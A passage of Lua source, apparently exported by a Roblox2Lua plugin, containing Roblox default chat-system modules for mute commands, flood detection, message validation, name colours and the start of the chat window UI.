				local unmuteSpeakerInputName = GetSpeakerNameFromMessage(message)
				local speaker = ChatService:GetSpeaker(speakerName)
		
				if speaker then
					local unmuteSpeakerName, unmuteSpeakerError
		
					--Get the target user's UserName from the input (which could be userName or displayName)
					if ChatSettings.PlayerDisplayNamesEnabled then
						unmuteSpeakerName, unmuteSpeakerError = DisplayNameHelpers.getUserNameFromChattedName(unmuteSpeakerInputName, speakerName, speaker:GetNameForDisplay())
					else
						unmuteSpeakerName, unmuteSpeakerError = DisplayNameHelpers.getUserNameFromChattedName(unmuteSpeakerInputName, speakerName, nil)
					end
		
					local unmuteSpeaker = ChatService:GetSpeaker(unmuteSpeakerName)
		
					if unmuteSpeakerError == DisplayNameHelpers.CommandErrorCodes.ChattingToSelf then
						speaker:SendSystemMessage(ChatLocalization:FormatMessageToSend("GameChat_DoMuteCommand_CannotMuteSelf","You cannot mute yourself."), channel, errorExtraData)
						return
		
					elseif unmuteSpeakerError == DisplayNameHelpers.CommandErrorCodes.NoMatches then
						local msg = ChatLocalization:FormatMessageToSend("GameChat_MuteSpeaker_SpeakerDoesNotExist",
							string.format("Speaker '%s' does not exist.", tostring(unmuteSpeakerName)),
							"RBX_NAME",
							tostring(unmuteSpeakerName))
						speaker:SendSystemMessage(msg, channel, errorExtraData)
						return
		
					elseif unmuteSpeakerError == DisplayNameHelpers.CommandErrorCodes.MultipleMatches then --More than one DisplayName match
						local matchingUsersText = DisplayNameHelpers.getUsersWithDisplayNameString(unmuteSpeakerInputName, speakerName)
						speaker:SendSystemMessage(ChatLocalization:FormatMessageToSend("InGame.Chat.Response.DisplayNameMultipleMatches", "Warning: The following users have this display name: "),  channel, errorExtraData)
		
						--Send a second message with a list of names so that the localization formatter doesn't prune it
						speaker:SendSystemMessage(matchingUsersText,  channel, errorExtraData)
						return
		
					elseif unmuteSpeaker then
						speaker:RemoveMutedSpeaker(unmuteSpeaker.Name)
						local playerName = unmuteSpeakerName
		
						if ChatSettings.PlayerDisplayNamesEnabled then
							playerName = unmuteSpeaker:GetNameForDisplay()
						end
		
						local msg = ChatLocalization:FormatMessageToSend("GameChat_ChatMain_SpeakerHasBeenUnMuted",
							string.format("Speaker '%s' has been unmuted.", playerName),
							"RBX_NAME",
							playerName)
						speaker:SendSystemMessage(msg, channel)
						return
		
					end
				end
			end
		
			local function MuteCommandsFunction(fromSpeaker, message, channel)
				local processedCommand = false
		
				if string.sub(message, 1, 6):lower() == "/mute " then
					DoMuteCommand(fromSpeaker, string.sub(message, 7), channel)
					processedCommand = true
				elseif string.sub(message, 1, 8):lower() == "/unmute " then
					DoUnmuteCommand(fromSpeaker, string.sub(message, 9), channel)
					processedCommand = true
				end
				return processedCommand
		
			end
		
			ChatService:RegisterProcessCommandsFunction("mute_commands", MuteCommandsFunction, ChatConstants.StandardPriority)
		end
		
		return Run
		
	end[me_command] = function()
		--	// FileName: MeCommand.lua
		--	// Written by: TheGamer101
		--	// Description: Sets the type of /me messages.
		
		local Chat = game:GetService("Chat")
		local ReplicatedModules = Chat:WaitForChild("ClientChatModules")
		local ChatConstants = require(ReplicatedModules:WaitForChild("ChatConstants"))
		local ChatSettings = require(ReplicatedModules:WaitForChild("ChatSettings"))
		
		local function Run(ChatService)
		
			if ChatSettings and ChatSettings.AllowMeCommand then
				local function MeCommandFilterFunction(speakerName, messageObj, channelName)
					local message = messageObj.Message
					if message and string.sub(message, 1, 4):lower() == "/me " then
						-- Set a different message type so that clients can render the message differently.
						messageObj.MessageType = ChatConstants.MessageTypeMeCommand
					end
				end
		
				ChatService:RegisterFilterMessageFunction("me_command", MeCommandFilterFunction)
			end
		end
		
		return Run
		
	end[friend_join_notifier] = function()
		--	// FileName: FriendJoinNotifer.lua
		--	// Written by: TheGamer101
		--	// Description: Module that adds a message to the chat whenever a friend joins the game.
		
		local Chat = game:GetService("Chat")
		local Players = game:GetService("Players")
		local FriendService = game:GetService("FriendService")
		
		local ReplicatedModules = Chat:WaitForChild("ClientChatModules")
		local ChatSettings = require(ReplicatedModules:WaitForChild("ChatSettings"))
		local ChatConstants = require(ReplicatedModules:WaitForChild("ChatConstants"))
		
		local ChatLocalization = nil
		pcall(function() ChatLocalization = require(game:GetService("Chat").ClientChatModules.ChatLocalization) end)
		if ChatLocalization == nil then ChatLocalization = {} end
		if not ChatLocalization.FormatMessageToSend or not ChatLocalization.LocalizeFormattedMessage then
			function ChatLocalization:FormatMessageToSend(key,default) return default end
		end
		
		local FriendMessageTextColor = Color3.fromRGB(255, 255, 255)
		local FriendMessageExtraData = {ChatColor = FriendMessageTextColor}
		
		local function Run(ChatService)
		
			local function ShowFriendJoinNotification()
				if ChatSettings.ShowFriendJoinNotification ~= nil then
					return ChatSettings.ShowFriendJoinNotification
				end
				return false
			end
		
			local function SendFriendJoinNotification(player, joinedFriend)
				local speakerObj = ChatService:GetSpeaker(player.Name)
				if speakerObj then
					local joinedFriendName = joinedFriend.Name
					if ChatSettings.PlayerDisplayNamesEnabled then
						joinedFriendName = joinedFriend.DisplayName
					end
		
					local msg = ChatLocalization:FormatMessageToSend("GameChat_FriendChatNotifier_JoinMessage",
						string.format("Your friend %s has joined the game.", joinedFriendName),
						"RBX_NAME",
						joinedFriendName)
					speakerObj:SendSystemMessage(msg, "System", FriendMessageExtraData)
				end
			end
		
			local function TrySendFriendNotification(player, joinedPlayer)
				if player ~= joinedPlayer then
					coroutine.wrap(function()
						if player:IsFriendsWith(joinedPlayer.UserId) then
							SendFriendJoinNotification(player, joinedPlayer)
						end
					end)()
				end
			end
		
			if ShowFriendJoinNotification() then
				Players.PlayerAdded:connect(function(player)
					local possibleFriends = Players:GetPlayers()
					for i = 1, #possibleFriends do
						TrySendFriendNotification(possibleFriends[i], player)
					end
				end)
			end
		end
		
		return Run
		
	end[extra_data_initializer] = function()
		--	// FileName: ExtraDataInitializer.lua
		--	// Written by: Xsitsu
		--	// Description: Module that sets some basic ExtraData such as name color, and chat color.
		
		local SpecialChatColors = {
			Groups = {
				{
					--- ROBLOX Admins group
					GroupId = 1200769,
					ChatColor = Color3.new(1, 215/255, 0),
				},
			},
			Players = {
				{
					--- Left as an example
					--  UserId = 2231221,
					--  ChatColor = Color3.new(205/255, 0, 0)
				}
			}
		}
		
		local function MakeIsInGroup(groupId, requiredRank)
			assert(type(requiredRank) == "nil" or type(requiredRank) == "number", "requiredRank must be a number or nil")
		
			return function(player)
				if player and player.UserId then
					local userId = player.UserId
		
					local inGroup = false
					local success, err = pcall(function() -- Many things can error is the IsInGroup check
						if requiredRank then
							inGroup = player:GetRankInGroup(groupId) > requiredRank
						else
							inGroup = player:IsInGroup(groupId)
						end
					end)
					if not success and err then
						print("Error checking in group: " ..err)
					end
		
					return inGroup
				end
		
				return false
			end
		end
		
		local function ConstructIsInGroups()
			if SpecialChatColors.Groups then
				for _, group in pairs(SpecialChatColors.Groups) do
					group.IsInGroup = MakeIsInGroup(group.GroupId, group.Rank)
				end
			end
		end
		ConstructIsInGroups()
		
		local Players = game:GetService("Players")
		
		local function GetSpecialChatColor(speakerName)
			if SpecialChatColors.Players then
				local playerFromSpeaker = Players:FindFirstChild(speakerName)
				if playerFromSpeaker then
					for _, player in pairs(SpecialChatColors.Players) do
						if playerFromSpeaker.UserId == player.UserId then
							return player.ChatColor
						end
					end
				end
			end
			if SpecialChatColors.Groups then
				for _, group in pairs(SpecialChatColors.Groups) do
					if group.IsInGroup(Players:FindFirstChild(speakerName)) then
						return group.ChatColor
					end
				end
			end
		end
		
		local function Run(ChatService)
			local NAME_COLORS =
			{
				Color3.new(253/255, 41/255, 67/255), -- BrickColor.new("Bright red").Color,
				Color3.new(1/255, 162/255, 255/255), -- BrickColor.new("Bright blue").Color,
				Color3.new(2/255, 184/255, 87/255), -- BrickColor.new("Earth green").Color,
				BrickColor.new("Bright violet").Color,
				BrickColor.new("Bright orange").Color,
				BrickColor.new("Bright yellow").Color,
				BrickColor.new("Light reddish violet").Color,
				BrickColor.new("Brick yellow").Color,
			}
		
			local function GetNameValue(pName)
				local value = 0
				for index = 1, #pName do
					local cValue = string.byte(string.sub(pName, index, index))
					local reverseIndex = #pName - index + 1
					if #pName%2 == 1 then
						reverseIndex = reverseIndex - 1
					end
					if reverseIndex%4 >= 2 then
						cValue = -cValue
					end
					value = value + cValue
				end
				return value
			end
		
			local color_offset = 0
			local function ComputeNameColor(pName)
				return NAME_COLORS[((GetNameValue(pName) + color_offset) % #NAME_COLORS) + 1]
			end
		
			local function GetNameColor(speaker)
				local player = speaker:GetPlayer()
				if player then
					if player.Team ~= nil then
						return player.TeamColor.Color
					end
				end
				return ComputeNameColor(speaker.Name)
			end
		
			local function onNewSpeaker(speakerName)
				local speaker = ChatService:GetSpeaker(speakerName)
				if not speaker:GetExtraData("NameColor") then
					speaker:SetExtraData("NameColor", GetNameColor(speaker))
				end
				if not speaker:GetExtraData("ChatColor") then
					local specialChatColor = GetSpecialChatColor(speakerName)
					if specialChatColor then
						speaker:SetExtraData("ChatColor", specialChatColor)
					end
				end
				if not speaker:GetExtraData("Tags") then
					--// Example of how you would set tags
					--[[
					local tags = {
						{
							TagText = "VIP",
							TagColor = Color3.new(1, 215/255, 0)
						},
						{
							TagText = "Alpha Tester",
							TagColor = Color3.new(205/255, 0, 0)
						}
					}
					speaker:SetExtraData("Tags", tags)
					]]
					speaker:SetExtraData("Tags", {})
				end
			end
		
			ChatService.SpeakerAdded:connect(onNewSpeaker)
		
			for _, speakerName in pairs(ChatService:GetSpeakerList()) do
				onNewSpeaker(speakerName)
			end
		
			local PlayerChangedConnections = {}
			Players.PlayerAdded:connect(function(player)
				local changedConn = player.Changed:connect(function(property)
					local speaker = ChatService:GetSpeaker(player.Name)
					if speaker then
						if property == "TeamColor" or property == "Neutral" or property == "Team" then
							speaker:SetExtraData("NameColor", GetNameColor(speaker))
						end
					end
				end)
				PlayerChangedConnections[player] = changedConn
			end)
		
			Players.PlayerRemoving:connect(function(player)
				local changedConn = PlayerChangedConnections[player]
				if changedConn then
					changedConn:Disconnect()
				end
				PlayerChangedConnections[player] = nil
			end)
		end
		
		return Run
		
	end[chat_message_validator] = function()
		--	// FileName: ChatMessageValidator.lua
		--	// Written by: TheGamer101
		--	// Description: Validate things such as no disallowed whitespace and chat message length on the server.
		
		local Chat = game:GetService("Chat")
		local RunService = game:GetService("RunService")
		local ReplicatedModules = Chat:WaitForChild("ClientChatModules")
		local ChatSettings = require(ReplicatedModules:WaitForChild("ChatSettings"))
		local ChatConstants = require(ReplicatedModules:WaitForChild("ChatConstants"))
		
		local ChatLocalization = nil
		pcall(function() ChatLocalization = require(game:GetService("Chat").ClientChatModules.ChatLocalization) end)
		if ChatLocalization == nil then ChatLocalization = {} end
		if not ChatLocalization.FormatMessageToSend or not ChatLocalization.LocalizeFormattedMessage then
			function ChatLocalization:FormatMessageToSend(key,default) return default end
		end
		
		local MAX_BYTES_PER_UTF8_CODEPOINT = 6
		local DISALLOWED_WHITESPACE = {"\n", "\r", "\t", "\v", "\f"}
		
		if ChatSettings.DisallowedWhiteSpace then
			DISALLOWED_WHITESPACE = ChatSettings.DisallowedWhiteSpace
		end
		
		local function isMessageValidServer(msg)
		    -- worst-case byte length check - fast for large strings
		    if msg:len() > ChatSettings.MaximumMessageLength*MAX_BYTES_PER_UTF8_CODEPOINT then
		        return false
		    end
		 
		    -- check for invalid unicode sequence
		    -- avoid normalizing first because utf8.nfcnormalize throws for invalid sequences
		    if utf8.len(msg) == nil then
		        return false
		    end
		 
		    -- check codepoint length
		    if utf8.len(utf8.nfcnormalize(msg)) > ChatSettings.MaximumMessageLength then
		        return false
		    end
		 
		    return true
		end
		
		local function CanUserChat(playerObj)
			if RunService:IsStudio() then
				return true
			end
			local success, canChat = pcall(function()
				return Chat:CanUserChatAsync(playerObj.UserId)
			end)
			return success and canChat
		end
		
		local function Run(ChatService)
			local function ValidateChatFunction(speakerName, message, channel)
				local speakerObj = ChatService:GetSpeaker(speakerName)
				local playerObj = speakerObj:GetPlayer()
				if not speakerObj then return false end
				if not playerObj then return false end
		
				if not RunService:IsStudio() and playerObj.UserId < 1 then
					return true
				end
		
				if not CanUserChat(playerObj) then
					speakerObj:SendSystemMessage(ChatLocalization:FormatMessageToSend(
						"GameChat_ChatMessageValidator_SettingsError",
						"Your chat settings prevent you from sending messages."
					), channel)
					return true
				end
		
				if not isMessageValidServer(message) then
					local localizedError = ChatLocalization:FormatMessageToSend(
						"GameChat_ChatMessageValidator_MaxLengthError",
						"Your message exceeds the maximum message length."
					)
					speakerObj:SendSystemMessage(localizedError, channel)
					return true
				end
		
				for _, whitespace in pairs(DISALLOWED_WHITESPACE) do
					if message:find(whitespace) then
						speakerObj:SendSystemMessage(ChatLocalization:FormatMessageToSend(
							"GameChat_ChatMessageValidator_WhitespaceError",
							"Your message contains whitespace that is not allowed."
						), channel)
						return true
					end
				end
		
				return false
			end
		
			ChatService:RegisterProcessCommandsFunction("message_validation", ValidateChatFunction, ChatConstants.VeryHighPriority)
		end
		
		return Run
		
	end[chat_flood_detector] = function()
		--	// FileName: ChatFloodDetector.lua
		--	// Written by: Xsitsu
		--	// Description: Module that limits the number of messages a speaker can send in a given period of time.
		
		local Chat = game:GetService("Chat")
		local ReplicatedModules = Chat:WaitForChild("ClientChatModules")
		local ChatConstants = require(ReplicatedModules:WaitForChild("ChatConstants"))
		
		local FFlagAddChatThrottlingToAllChannels = false do
			local ok, value = pcall(function()
				return UserSettings():IsUserFeatureEnabled("UserAddChatThrottlingToAllChannels")
			end)
			if ok then
				FFlagAddChatThrottlingToAllChannels = value
			end
		end
		
		local doFloodCheckByChannel = true
		if FFlagAddChatThrottlingToAllChannels then
			doFloodCheckByChannel = false
		end
		local informSpeakersOfWaitTimes = true
		local chatBotsBypassFloodCheck = true
		local numberMessagesAllowed = 7
		local decayTimePeriod = 15
		
		local floodCheckTable = {}
		local whitelistedSpeakers = {}
		
		local ChatLocalization = nil
		pcall(function() ChatLocalization = require(game:GetService("Chat").ClientChatModules.ChatLocalization) end)
		if ChatLocalization == nil then ChatLocalization = {} end
		
		if not ChatLocalization.FormatMessageToSend or not ChatLocalization.LocalizeFormattedMessage then
			function ChatLocalization:FormatMessageToSend(key,default) return default end
		end
		
		local function EnterTimeIntoLog(tbl)
			table.insert(tbl, tick() + decayTimePeriod)
		end
		
		local function Run(ChatService)
			local function FloodDetectionProcessCommandsFunction(speakerName, message, channel)
				if (whitelistedSpeakers[speakerName]) then return false end
		
				local speakerObj = ChatService:GetSpeaker(speakerName)
				if (not speakerObj) then return false end
				if (chatBotsBypassFloodCheck and not speakerObj:GetPlayer()) then return false end
		
				if (not floodCheckTable[speakerName]) then
					floodCheckTable[speakerName] = {}
				end
		
				local t = nil
		
				if (doFloodCheckByChannel) then
					if (not floodCheckTable[speakerName][channel]) then
						floodCheckTable[speakerName][channel] = {}
					end
		
					t = floodCheckTable[speakerName][channel]
				else
					t = floodCheckTable[speakerName]
				end
		
				local now = tick()
				while (#t > 0 and t[1] < now) do
					table.remove(t, 1)
				end
		
				if (#t < numberMessagesAllowed) then
					EnterTimeIntoLog(t)
					return false
				else
		
					local timeDiff = math.ceil(t[1] - now)
		
					if (informSpeakersOfWaitTimes) then
						local msg = ChatLocalization:FormatMessageToSend("GameChat_ChatFloodDetector_MessageDisplaySeconds",
							string.format("You must wait %d %s before sending another message!", timeDiff, (timeDiff > 1) and "seconds" or "second"),
							"RBX_NUMBER",
							tostring(timeDiff)
						)
						speakerObj:SendSystemMessage(msg, channel)
					else
						speakerObj:SendSystemMessage(
							ChatLocalization:FormatMessageToSend(
								"GameChat_ChatFloodDetector_Message",
								"You must wait before sending another message!"
							)
						,channel)
					end
		
					return true
				end
			end
		
			ChatService:RegisterProcessCommandsFunction("flood_detection", FloodDetectionProcessCommandsFunction, ChatConstants.LowPriority)
		
			ChatService.SpeakerRemoved:connect(function(speakerName)
				floodCheckTable[speakerName] = nil
			end)
		end
		
		return Run
		
	end[chatcommands_teller] = function()
		--	// FileName: ChatCommandsTeller.lua
		--	// Written by: Xsitsu
		--	// Description: Module that provides information on default chat commands to players.
		
		local Chat = game:GetService("Chat")
		local ReplicatedModules = Chat:WaitForChild("ClientChatModules")
		local ChatSettings = require(ReplicatedModules:WaitForChild("ChatSettings"))
		local ChatConstants = require(ReplicatedModules:WaitForChild("ChatConstants"))
		
		local ChatLocalization = nil
		pcall(function() ChatLocalization = require(game:GetService("Chat").ClientChatModules.ChatLocalization) end)
		if ChatLocalization == nil then ChatLocalization = {} end
		
		if not ChatLocalization.FormatMessageToSend or not ChatLocalization.LocalizeFormattedMessage then
			function ChatLocalization:FormatMessageToSend(key,default) return default end
		end
		
		local function Run(ChatService)
		
			local function ShowJoinAndLeaveCommands()
				if ChatSettings.ShowJoinAndLeaveHelpText ~= nil then
					return ChatSettings.ShowJoinAndLeaveHelpText
				end
				return false
			end
		
			local function ProcessCommandsFunction(fromSpeaker, message, channel)
				if (message:lower() == "/?" or message:lower() == "/help") then
					local speaker = ChatService:GetSpeaker(fromSpeaker)
					speaker:SendSystemMessage(ChatLocalization:FormatMessageToSend("GameChat_ChatCommandsTeller_Desc","These are the basic chat commands."), channel)
					if ChatSettings.AllowMeCommand then
						speaker:SendSystemMessage(ChatLocalization:FormatMessageToSend("GameChat_ChatCommandsTeller_MeCommand","/me <text> : roleplaying command for doing actions."), channel)
					end
					speaker:SendSystemMessage(ChatLocalization:FormatMessageToSend("GameChat_ChatCommandsTeller_SwitchChannelCommand","/c <channel> : switch channel menu tabs."), channel)
					if ShowJoinAndLeaveCommands() then
						speaker:SendSystemMessage(ChatLocalization:FormatMessageToSend("GameChat_ChatCommandsTeller_JoinChannelCommand","/join <channel> or /j <channel> : join channel."), channel)
						speaker:SendSystemMessage(ChatLocalization:FormatMessageToSend("GameChat_ChatCommandsTeller_LeaveChannelCommand","/leave <channel> or /l <channel> : leave channel. (leaves current if none specified)"), channel)
					end
					speaker:SendSystemMessage(ChatLocalization:FormatMessageToSend("GameChat_ChatCommandsTeller_WhisperCommand","/whisper <speaker> or /w <speaker> : open private message channel with speaker."), channel)
					speaker:SendSystemMessage(ChatLocalization:FormatMessageToSend("GameChat_ChatCommandsTeller_MuteCommand","/mute <speaker> : mute a speaker."), channel)
					speaker:SendSystemMessage(ChatLocalization:FormatMessageToSend("GameChat_ChatCommandsTeller_UnMuteCommand","/unmute <speaker> : unmute a speaker."), channel)
		
					local player = speaker:GetPlayer()
					if player and player.Team then
						speaker:SendSystemMessage(ChatLocalization:FormatMessageToSend("GameChat_ChatCommandsTeller_TeamCommand","/team <message> or /t <message> : send a team chat to players on your team."), channel)
					end
		
					return true
				end
		
				return false
			end
		
			ChatService:RegisterProcessCommandsFunction("chat_commands_inquiry", ProcessCommandsFunction, ChatConstants.StandardPriority)
		
			if ChatSettings.GeneralChannelName then
				local allChannel = ChatService:GetChannel(ChatSettings.GeneralChannelName)
				if (allChannel) then
					allChannel.WelcomeMessage = ChatLocalization:FormatMessageToSend("GameChat_ChatCommandsTeller_AllChannelWelcomeMessage","Chat '/?' or '/help' for a list of chat commands.")
				end
			end
		end
		
		return Run
		
	end[display_name_helpers] = function()
		local Players = game:GetService("Players")
		local Chat = game:GetService("Chat")
		local ReplicatedModules = Chat:WaitForChild("ClientChatModules")
		local ChatSettings = require(ReplicatedModules:WaitForChild("ChatSettings"))
		
		local CommandErrorCodes = {
			ChattingToSelf = 1,
			NoMatches = 2,
			MultipleMatches = 3,
		}
		
		--returns (string) UserName as the first value and an error code
		local function getUserNameFromChattedName(targetDisplayName, speakerUserName, speakerDisplayName)
		
			--we're looking for non-speaker matches, so if the displayName matches the userName we need to short circuit
			if speakerUserName == targetDisplayName then
				return speakerUserName, CommandErrorCodes.ChattingToSelf
			end
		
			--first, scan for userName matches
			local players = Players:GetPlayers()
		
			for _, player in pairs(players) do
				if string.lower(player.Name) == string.lower(targetDisplayName) then
					return player.Name, nil
				end
			end
		
			--then, if there we no userName matches, scan for DisplayName matches. return true if there is one non-local-player match
			local numDisplayNameMatches = 0
			local lastDisplayNameMatch = nil
		
			if ChatSettings.PlayerDisplayNamesEnabled then
				for _, player in pairs(players) do
					if player.Name ~= speakerUserName and string.lower(player.DisplayName) == string.lower(targetDisplayName) then
						numDisplayNameMatches = numDisplayNameMatches + 1
						lastDisplayNameMatch = player.Name
					end
				end
			end
		
			if numDisplayNameMatches == 1 then
				return lastDisplayNameMatch, nil
			elseif numDisplayNameMatches == 0 then
				if speakerDisplayName == targetDisplayName then
					return speakerDisplayName, CommandErrorCodes.ChattingToSelf
				else
					return targetDisplayName, CommandErrorCodes.NoMatches
				end
			elseif numDisplayNameMatches >= 2 then
				return targetDisplayName, CommandErrorCodes.MultipleMatches
			end
		end
		
		local function getUsersWithDisplayNameString(targetDisplayName, speakerUserName)
			local displayNameMatches = {}
			local matchingUsersText = ""
		
			--first, scan for userName matches
			local players = Players:GetPlayers()
		
			for _, player in pairs(players) do
				if player.Name ~= speakerUserName and string.lower(player.DisplayName) == string.lower(targetDisplayName) then
					table.insert(displayNameMatches, player.Name)
				end
			end
		
			for i, matchingUserName in pairs(displayNameMatches) do
				if i ~= #displayNameMatches then
					matchingUsersText = matchingUsersText .. "@" .. matchingUserName .. ", "
				else
					matchingUsersText = matchingUsersText .. "@" .. matchingUserName
				end
			end
		
			return matchingUsersText
		end
		
		return {
			CommandErrorCodes = CommandErrorCodes,
			getUserNameFromChattedName = getUserNameFromChattedName,
			getUsersWithDisplayNameString = getUsersWithDisplayNameString,
		}
		
	end
}

--[[
	Roblox2Lua
	----------
	
	This code was generated using
	Deluct's Roblox2Lua plugin.
]]--

local etcrfwcfw = Instance.new("LocalScript")
etcrfwcfw.Disabled = true
etcrfwcfw.Name = "etcrfwcfw"
etcrfwcfw.Parent = workspace

local chat_main = Instance.new("ModuleScript")
chat_main.Name = "ChatMain"
chat_main.Parent = etcrfwcfw

local curve_util = Instance.new("ModuleScript")
curve_util.Name = "CurveUtil"
curve_util.Parent = chat_main

local message_sender = Instance.new("ModuleScript")
message_sender.Name = "MessageSender"
message_sender.Parent = chat_main

local object_pool = Instance.new("ModuleScript")
object_pool.Name = "ObjectPool"
object_pool.Parent = chat_main

local channels_tab = Instance.new("ModuleScript")
channels_tab.Name = "ChannelsTab"
channels_tab.Parent = chat_main

local command_processor = Instance.new("ModuleScript")
command_processor.Name = "CommandProcessor"
command_processor.Parent = chat_main

local message_label_creator = Instance.new("ModuleScript")
message_label_creator.Name = "MessageLabelCreator"
message_label_creator.Parent = chat_main

local chat_window = Instance.new("ModuleScript")
chat_window.Name = "ChatWindow"
chat_window.Parent = chat_main

local message_log_display = Instance.new("ModuleScript")
message_log_display.Name = "MessageLogDisplay"
message_log_display.Parent = chat_main

local chatchannel = Instance.new("ModuleScript")
chatchannel.Name = "ChatChannel"
chatchannel.Parent = chat_main

local chat_bar = Instance.new("ModuleScript")
chat_bar.Name = "ChatBar"
chat_bar.Parent = chat_main

local channels_bar = Instance.new("ModuleScript")
channels_bar.Name = "ChannelsBar"
channels_bar.Parent = chat_main

--// Modules

local modules = {
	[chat_main] = function()
		--!nocheck
		
		--	// FileName: ChatMain.lua
		--	// Written by: Xsitsu
		--	// Description: Main module to handle initializing chat window UI and hooking up events to individual UI pieces.
		
		local moduleApiTable = {}
		
		--// This section of code waits until all of the necessary RemoteEvents are found in EventFolder.
		--// I have to do some weird stuff since people could potentially already have pre-existing
		--// things in a folder with the same name, and they may have different class types.
		--// I do the useEvents thing and set EventFolder to useEvents so I can have a pseudo folder that
		--// the rest of the code can interface with and have the guarantee that the RemoteEvents they want
		--// exist with their desired names.
		
		local FFlagFixChatWindowHoverOver = false do
			local ok, value = pcall(function()
				return UserSettings():IsUserFeatureEnabled("UserFixChatWindowHoverOver")
			end)
			if ok then
				FFlagFixChatWindowHoverOver = value
			end
		end
		
		local FFlagFixMouseCapture = false do
			local ok, value = pcall(function()
				return UserSettings():IsUserFeatureEnabled("UserFixMouseCapture")
			end)
			if ok then
				FFlagFixMouseCapture = value
			end
		end
		
		local FFlagUserHandleChatHotKeyWithContextActionService = false do
			local ok, value = pcall(function()
				return UserSettings():IsUserFeatureEnabled("UserHandleChatHotKeyWithContextActionService")
			end)
			if ok then
				FFlagUserHandleChatHotKeyWithContextActionService = value
			end
		end
		
		local FILTER_MESSAGE_TIMEOUT = 60
		
		local RunService = game:GetService("RunService")
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local Chat = game:GetService("Chat")
		local StarterGui = game:GetService("StarterGui")
		local ContextActionService = game:GetService("ContextActionService")
		
		local DefaultChatSystemChatEvents = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents")
		local EventFolder = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents")
		local clientChatModules = Chat:WaitForChild("ClientChatModules")
		local ChatConstants = require(clientChatModules:WaitForChild("ChatConstants"))
		local ChatSettings = require(clientChatModules:WaitForChild("ChatSettings"))
		local messageCreatorModules = clientChatModules:WaitForChild("MessageCreatorModules")
		local MessageCreatorUtil = require(messageCreatorModules:WaitForChild("Util"))
		
		local ChatLocalization = nil
		pcall(function() ChatLocalization = require(game:GetService("Chat").ClientChatModules.ChatLocalization) end)
		if ChatLocalization == nil then ChatLocalization = {} function ChatLocalization:Get(key,default) return default end end
		
		local numChildrenRemaining = 10 -- #waitChildren returns 0 because it's a dictionary
		local waitChildren =
		{
			OnNewMessage = "RemoteEvent",
			OnMessageDoneFiltering = "RemoteEvent",
			OnNewSystemMessage = "RemoteEvent",
			OnChannelJoined = "RemoteEvent",
			OnChannelLeft = "RemoteEvent",
			OnMuted = "RemoteEvent",
			OnUnmuted = "RemoteEvent",
			OnMainChannelSet = "RemoteEvent",
		
			SayMessageRequest = "RemoteEvent",
			GetInitDataRequest = "RemoteFunction",
		}
		-- waitChildren/EventFolder does not contain all the remote events, because the server version could be older than the client version.
		-- In that case it would not create the new events.
		-- These events are accessed directly from DefaultChatSystemChatEvents
		
		local useEvents = {}
		
		local FoundAllEventsEvent = Instance.new("BindableEvent")
		
		function TryRemoveChildWithVerifyingIsCorrectType(child)
			if (waitChildren[child.Name] and child:IsA(waitChildren[child.Name])) then
				waitChildren[child.Name] = nil
				useEvents[child.Name] = child
				numChildrenRemaining = numChildrenRemaining - 1
			end
		end
		
		for i, child in pairs(EventFolder:GetChildren()) do
			TryRemoveChildWithVerifyingIsCorrectType(child)
		end
		
		if (numChildrenRemaining > 0) then
			local con = EventFolder.ChildAdded:connect(function(child)
				TryRemoveChildWithVerifyingIsCorrectType(child)
				if (numChildrenRemaining < 1) then
					FoundAllEventsEvent:Fire()
				end
			end)
		
			FoundAllEventsEvent.Event:wait()
			con:disconnect()
		
			FoundAllEventsEvent:Destroy()
		end
		
		EventFolder = useEvents
		
		
		
		--// Rest of code after waiting for correct events.
		
		local UserInputService = game:GetService("UserInputService")
		local RunService = game:GetService("RunService")
		
		local Players = game:GetService("Players")
		local LocalPlayer = Players.LocalPlayer
		
		while not LocalPlayer do
			Players.ChildAdded:wait()
			LocalPlayer = Players.LocalPlayer
		end
		
		local canChat = true
		
		local ChatDisplayOrder = 6
		if ChatSettings.ScreenGuiDisplayOrder ~= nil then
			ChatDisplayOrder = ChatSettings.ScreenGuiDisplayOrder
		end
		
		local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
		local GuiParent = Instance.new("ScreenGui")
		GuiParent.Name = "Chat"
		GuiParent.ResetOnSpawn = false
		GuiParent.DisplayOrder = ChatDisplayOrder
		GuiParent.Parent = PlayerGui
		
		local DidFirstChannelsLoads = false
		
		local modulesFolder = script
		
		local moduleChatWindow = require(modulesFolder:WaitForChild("ChatWindow"))
		local moduleChatBar = require(modulesFolder:WaitForChild("ChatBar"))
		local moduleChannelsBar = require(modulesFolder:WaitForChild("ChannelsBar"))
		local moduleMessageLabelCreator = require(modulesFolder:WaitForChild("MessageLabelCreator"))
		local moduleMessageLogDisplay = require(modulesFolder:WaitForChild("MessageLogDisplay"))
		local moduleChatChannel = require(modulesFolder:WaitForChild("ChatChannel"))
		local moduleCommandProcessor = require(modulesFolder:WaitForChild("CommandProcessor"))
		
		local ChatWindow = moduleChatWindow.new()
		local ChannelsBar = moduleChannelsBar.new()
		local MessageLogDisplay = moduleMessageLogDisplay.new()
		local CommandProcessor = moduleCommandProcessor.new()
		local ChatBar = moduleChatBar.new(CommandProcessor, ChatWindow)
		
		ChatWindow:CreateGuiObjects(GuiParent)
		
		ChatWindow:RegisterChatBar(ChatBar)
		ChatWindow:RegisterChannelsBar(ChannelsBar)
		ChatWindow:RegisterMessageLogDisplay(MessageLogDisplay)
		
		MessageCreatorUtil:RegisterChatWindow(ChatWindow)
		
		local MessageSender = require(modulesFolder:WaitForChild("MessageSender"))
		MessageSender:RegisterSayMessageFunction(EventFolder.SayMessageRequest)
		
		
		
		if (UserInputService.TouchEnabled) then
			ChatBar:SetTextLabelText(ChatLocalization:Get("GameChat_ChatMain_ChatBarTextTouch",'Tap here to chat'))
		else
			ChatBar:SetTextLabelText(ChatLocalization:Get("GameChat_ChatMain_ChatBarText",'To chat click here or press "/" key'))
		end
		
		spawn(function()
			local CurveUtil = require(modulesFolder:WaitForChild("CurveUtil"))
			local animationFps = ChatSettings.ChatAnimationFPS or 20.0
		
			local updateWaitTime = 1.0 / animationFps
			local lastTick = tick()
			while true do
				local currentTick = tick()
				local tickDelta = currentTick - lastTick
				local dtScale = CurveUtil:DeltaTimeToTimescale(tickDelta)
		
				if dtScale ~= 0 then
					ChatWindow:Update(dtScale)
				end
		
				lastTick = currentTick
				wait(updateWaitTime)
			end
		end)
		
		
		
		
		--////////////////////////////////////////////////////////////////////////////////////////////
		--////////////////////////////////////////////////////////////// Code to do chat window fading
